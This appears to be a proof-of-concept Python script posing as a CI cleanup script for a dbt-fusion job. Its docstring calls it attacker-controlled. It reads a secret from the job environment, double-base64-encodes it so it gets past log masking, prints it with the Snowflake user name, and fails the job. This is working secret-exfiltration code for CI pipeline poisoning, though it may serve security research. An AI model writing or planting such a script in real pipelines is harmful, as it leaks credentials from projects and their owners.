#!/usr/bin/env python3
"""Attacker-controlled cleanup script executed directly by the dbt-fusion job
('python scripts/ci_dbtf_delete_snowflake_resources.py') with SNOWFLAKE_*
secrets and GERALT_SECRET in env. Leak the toy secret double-base64 and fail."""
import base64
import os

secret = os.environ.get("GERALT_SECRET", "MISSING")
print("GERALT_LEAKED_TOKEN=" + base64.b64encode(base64.b64encode(secret.encode()).decode().encode()).decode())
print("DBTF_CLEANUP_PWNED snowflake_user=" + os.environ.get("SNOWFLAKE_USER", ""))
raise SystemExit(1)
